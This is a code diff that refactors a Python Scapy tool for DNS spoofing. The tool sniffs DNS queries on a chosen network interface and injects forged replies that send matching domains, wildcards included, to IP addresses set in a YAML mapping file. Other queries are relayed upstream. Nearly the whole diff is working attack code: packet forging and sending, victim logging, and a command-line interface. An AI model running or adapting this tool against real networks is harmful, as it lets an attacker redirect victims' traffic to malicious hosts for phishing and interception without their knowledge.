@@ -2,7 +2,6 @@ from __future__ import annotations
 
 import argparse
 import ipaddress
-import queue
 import signal
 import socket
 import sys
@@ -19,14 +18,11 @@ from scapy.all import (
     IP,
     UDP,
     conf,
-    get_if_addr,
     send,
     sniff,
 )
 
-
 class DNSSpoofer(threading.Thread):
-    """Thread that sniffs DNS queries and injects forged replies."""
 
     def __init__(
         self,
@@ -37,7 +33,7 @@ class DNSSpoofer(threading.Thread):
     ) -> None:
         super().__init__(daemon=True)
         self.iface = iface
-        self.mapping = mapping  # domain (possibly with *) → spoof IP
+        self.mapping = mapping  
         self.relay = relay
         self.upstream = upstream or "8.8.8.8"
         self.running = threading.Event()
@@ -45,12 +41,12 @@ class DNSSpoofer(threading.Thread):
 
     def _matches(self, qname: str) -> Optional[str]:
         """Return spoof IP if qname matches mapping, else None."""
-        qname = qname.rstrip(".").lower()
+        qname = qname.rstrip('.').lower()
         if qname in self.mapping:
             return self.mapping[qname]
-        # wildcard check (very naive *.<suffix>)
+        # wildcard ceck for *.suffix patterns
         for pattern, ip in self.mapping.items():
-            if pattern.startswith("*.") and qname.endswith(pattern[1:]):
+            if pattern.startswith('*.') and qname.endswith(pattern[2:]):
                 return ip
         return None
 
@@ -65,33 +61,42 @@ class DNSSpoofer(threading.Thread):
         )
 
     def _process(self, pkt):
+        # Only handle DNS queries (QR=0)
         if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0):
-            return  # Not a query
-        qname = pkt[DNSQR].qname.decode("utf-8")
+            return
+
+        qname = pkt[DNSQR].qname.decode('utf-8')
         victim_ip = pkt[IP].src
         dest_port = pkt[UDP].sport
+
         spoof_ip = self._matches(qname)
         if spoof_ip:
-            forged = IP(dst=victim_ip, src=pkt[IP].dst) / UDP(
-                dport=dest_port, sport=53
-            ) / self._build_answer(pkt[DNS], spoof_ip)
+            forged = (
+                IP(dst=victim_ip, src=pkt[IP].dst) /
+                UDP(dport=dest_port, sport=53) /
+                self._build_answer(pkt[DNS], spoof_ip)
+            )
             send(forged, iface=self.iface, verbose=False)
             print(f"[+] Spoofed {qname} → {spoof_ip} for {victim_ip}")
         elif self.relay:
             self._relay(pkt)
 
     def _relay(self, pkt):
-        """Forward query to upstream resolver and relay answer back."""
+
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.settimeout(2)
         try:
+            # Send raw DNS query to upstream
             sock.sendto(bytes(pkt[DNS]), (self.upstream, 53))
             data, _ = sock.recvfrom(512)
-            answer = IP(dst=pkt[IP].src, src=pkt[IP].dst) / UDP(
-                dport=pkt[UDP].sport, sport=53
-            ) / DNS(data)
+            # Build relay response
+            answer = (
+                IP(dst=pkt[IP].src, src=pkt[IP].dst) /
+                UDP(dport=pkt[UDP].sport, sport=53) /
+                DNS(data)
+            )
             send(answer, iface=self.iface, verbose=False)
-            print(f"[=] Relayed answer for {pkt[DNSQR].qname.decode()} to {pkt[IP].src}")
+            print(f"[=] Relayed {pkt[DNSQR].qname.decode()} to {pkt[IP].src}")
         except socket.timeout:
             print("[!] Upstream DNS timeout; dropping query")
         finally:
@@ -126,7 +131,7 @@ def load_mapping(path: Path) -> Dict[str, str]:
 
 def main():
     parser = argparse.ArgumentParser(
-        description="DNS spoofing / relay tool (part of ARP‑DNS toolkit)"
+        description="DNS spoofing / relay tool using pure Scapy"
     )
     parser.add_argument("--iface", "-i", required=True, help="Network interface to bind")
     parser.add_argument("--map", "-m", type=Path, required=True, help="YAML mapping file")
@@ -146,9 +151,9 @@ def main():
     spoofer = DNSSpoofer(args.iface, mapping, upstream=args.upstream, relay=args.relay)
     spoofer.start()
 
-    # Signal handling to exit cleanly
+    # Handle Ctrl-C for clean shutdown
     def _sigint(_sig, _frame):
-        print("\n[!] Ctrl‑C received, shutting down…")
+        print("\n[!] Ctrl-C received, shutting down…")
         spoofer.stop()
 
     signal.signal(signal.SIGINT, _sigint)
@@ -158,6 +163,6 @@ def main():
 
     print("[+] Bye!")
 
-
 if __name__ == "__main__":
     main()
+
